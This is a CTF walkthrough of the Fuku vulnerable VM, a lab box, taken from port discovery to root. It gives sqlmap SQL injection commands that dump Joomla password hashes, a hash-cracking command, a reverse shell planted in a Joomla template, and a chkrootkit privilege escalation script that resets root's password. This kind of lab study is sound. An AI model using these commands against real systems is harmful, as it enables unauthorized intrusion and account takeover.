# BNE0x02 - Fuku CTF Walkthough by Bull (@RobertWinkel)

1)	Find the IP address, e.g. netdiscover -r 192.168.56.0/24 (note that as the IP address changes every 23 minutes or so, this may need to be done several times).

2)	Find the services (there is only the web server on port 13370). Doing a nmap scan will produce thousands of false hits, so one way to sort through the false hits is to write a script that grabs the HTML from every port and sort through to find a size that is out of the ordinary, e.g. I used a script similar to the following, but did 10,000 ports at a time (my machine couldn't handle any more simultaneous connections):
```
   #!/bin/bash
   for i in `seq 1 65535`;
   do
   	echo "Saving $i..."
   	wget http://192.168.56.104:$i -O $i -q -t 1 &
   done
   ls -lSr | tail -10
```
3)	Access the Joomla site at http://192.168.56.X:13370/. Notice that HD FLV Player is in use. Search Exploit DB or similar and find that there is an SQL injection in /index.php?option=com_hdflvplayer&id=1

4)	Take advantage of the SQL injection to get the Joomla usernames and password hashes, e.g.:
```
   sqlmap -u "http://192.168.56.104:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql --tables --level=5 --risk=3
   sqlmap -u "http://192.168.56.104:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql -T jos_users --columns
   sqlmap -u "http://192.168.56.104:13370/index.php?option=com_hdflvplayer&id=1" -p id --dbms mysql -T jos_users -C username,password --dump
```   

5)	Crack the hash for username “gizmo”, e.g. by using the script from http://morxploit.com/joomlacrack.txt:
```
./joomlacrack.pl 6da55fdfcf53a4b3a07390921866cc18 qECsCP9t5NwPILY77j6hGM2MrgX4Je39 rockyou.txt 
```

6)	Login to the Joomla administration portal as gizmo. Go to Extensions / Template Manager. Edit the HTML to add a PHP reverse shell, or similar.

7)	Start up the reverse handler. Visit the PHP file to activate it, e.g. http://192.168.56.104:13370/templates/beez/index.php

8)	Optional: Turn the shell into an interactive one, e.g.:
```
   python -c 'import pty; pty.spawn("/bin/sh")'
```

9)	Find out the chkrootkit v0.49 is being run, e.g. by a “ps -ef”.

10)	Search Exploit DB or similar and find that there is an exploit for chkrootkit (https://www.exploit-db.com/exploits/33899/). 

11)	Create the file /tmp/update with some code to run as root, e.g. to change root’s password to “Password1”:
```
   #!/bin/bash
   echo -e "Password1\nPassword1" | passwd root
   touch /tmp/done
```
Due to some of the restrictions in fuku, useful commands like “wget” have been removed. Therefore something like the following might be used to create the necessary file:
```
   $ cat <<EOF>/tmp/update
   > #!/bin/bash
   > echo -e "Password1\nPassword1" | passwd root
   > touch /tmp/done
   > 
   > EOF
   $ chmod 755 /tmp/update
```

12)	Wait until chkrootkit is executed again (it runs every 5 minutes), and then take advantage of the exploit. In the above example, after changing root’s password to “Password1”, the next logical step is to SSH in as root.
```
   root@kali:/var/www# ssh root@192.168.56.104
   root@192.168.56.104's password: Password1
   Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)

    * Documentation:  https://help.ubuntu.com/

   0 packages can be updated.
   0 updates are security updates.

   Last login: Thu Aug 13 22:58:53 2015 from 192.168.56.102
```

13)	GAME OVER!

